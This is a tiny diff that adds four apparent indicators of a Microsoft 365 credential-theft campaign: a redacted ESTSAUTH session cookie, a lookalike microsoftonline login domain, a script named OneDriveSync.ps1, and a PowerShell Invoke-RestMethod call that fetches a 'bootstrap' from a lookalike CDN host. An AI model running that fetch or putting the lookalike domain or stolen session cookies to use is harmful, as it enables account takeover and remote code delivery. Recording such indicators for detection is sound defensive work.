@@ -1,0 +1,4 @@
+ESTSAUTH=AAABBBCCCDD-session-cookie-redacted
+https://microsoftonline-authn.com/tenant/nbio/docs?id=88411
+OneDriveSync.ps1
+Invoke-RestMethod -Uri https://cdn.mshelperassets.com/bootstrap?id=88411
